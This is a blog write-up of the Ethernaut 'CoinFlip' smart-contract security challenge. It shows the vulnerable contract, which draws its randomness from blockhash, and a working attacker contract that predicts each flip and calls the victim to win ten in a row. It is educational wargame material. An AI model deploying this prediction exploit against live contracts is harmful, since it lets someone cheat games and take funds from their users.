<!doctype html><html lang=en><head><title>CoinFlip - Ethernaut :: Dimitris Vagiakakos SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block."><meta name=keywords content="decentralized"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/coinflip/><link rel=stylesheet href=/styles.css><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content="Dimitris Vagiakakos"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="CoinFlip - Ethernaut"><meta property="og:description" content="Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block."><meta property="og:url" content="/blockchain_writeups/coinflip/"><meta property="og:site_name" content="Dimitris Vagiakakos SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2022-01-15 00:00:00 +0000 UTC"></head><body class=lime><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Dimitris Vagiakakos SV1SJP</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/whoami>$whoami</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek_Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/el/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/whoami>$whoami</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek_Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/el/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/blockchain_writeups/coinflip/>CoinFlip - Ethernaut</a></h1><div class=post-meta><time class=post-date>2022-01-15</time><span class=post-author>Dimitris Vagiakakos</span><span class=post-reading-time>4 min read (656 words)</span></div><div class=post-content><div><p>Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;

contract CoinFlip {

 using SafeMath for uint256;
 uint256 public consecutiveWins;
 uint256 lastHash;
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

 constructor() public {
   consecutiveWins = 0;
 }

 function flip(bool _guess) public returns (bool) {
   uint256 blockValue = uint256(blockhash(block.number.sub(1)));

   if (lastHash == blockValue) {
     revert();
   }

   lastHash = blockValue;
   uint256 coinFlip = blockValue.div(FACTOR);
   bool side = coinFlip == 1 ? true : false;

   if (side == _guess) {
     consecutiveWins++;
     return true;
   } else {
     consecutiveWins = 0;
     return false;
   }
 }
}
</code></pre><p>Computers are unable to generate true random numbers. Computers are combining different things in order to create numbers that people can&rsquo;t predict easily. But, if we repeat the process that computer followed to generate the random number, we will end up with that number. Ethereum is not providing any function for random numbers. As a result, programmers have to create their own functions for randomness or to use Oracles to import random numbers outside the Ethereum Network . As the Coin-Flip game smart-contract needed randomness, the programmer imported the Safemath library to protect it from underflows and it used a long uint256 number in the FACTOR variable.</p><p>In terms of Libraries, libraries are restricted in following ways:</p><ul><li>They cannot have state variables.</li><li>They cannot inherit nor be inherited.</li><li>They cannot receive Ether.</li><li>They cannot be destroyed.</li></ul><p>So, we have the public function flip on the smart-contract CoinFlip. We can see they call the blockchash in order to create a hash of one of the given blocks. From Solidity&rsquo;s documentation, we know that blockhash can only work for the 256 most recent blocks. On account of that, in the variable blockValue, we store the blockhash of the current block number, and then they divide by the long number which is stored in variable &ldquo;FACTOR&rdquo;.
Then, it returns a Boolean result. So as we know the process of creation of the random number, what if we try to repeat the process of constructing this &ldquo;random&rdquo; number in our malicious smart-contract and then send the pseudo-anonymous result as our &ldquo;guess&rdquo;?</p><pre tabindex=0><code> // SPDX-License-Identifier: MIT 
pragma solidity ^0.8.11;

//import the original smart-contact

import &#34;./CoinFlip.sol&#34;;


contract CoinFlipAttack {

    CoinFlip public victimContract;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _victimContractAddr) public {
        victimContract= CoinFlip(_victimContractAddr);

    }

//reproduce the function flip, but for the previous block, as the last block has been mined.
    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip= uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true: false;
        victimContract.flip(side);

}
}
</code></pre><p>In our own smart-contract, we reproduced the function flip but we modified the blockhash function to use the previous block as an input, as block has already been mined. Now we are ready to compile and deploy our malicious smart-contract which is ready to fool the original smart-contract. All we have to do is just to spam our cheat function 10 times, until we reach 10 consecutive wins.
However, as we can understand now, there is an another vulnerability here. As miners build them up with different transactions and they compete between themselves to commit their block to Ethereum&rsquo;s Blockchain, miners are able to exercise their judgement when building up blocks. A miner with the appropriate time, could try many different guesses and not commit blocks where he was mistaken. This one of the consequences of Proof Of Work based consensus mechanism, in the process of achieving a really random number.</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><p><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here</a></p></li><li><p><a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here</a></p></li></ul></div></div></article></div><footer class=footer><a rel=me href=https://fosstodon.org/@sv1sjp>Mastodon</a><div class=footer__inner><div class="copyright copyright--user"><span>All rights reserved, TuxHouse Educational Technologies - Dimitris LinuxOS - 2011-2023</span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>